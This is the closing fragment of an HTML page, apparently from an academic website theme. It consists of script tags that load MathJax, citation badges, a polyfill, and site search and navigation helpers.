src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>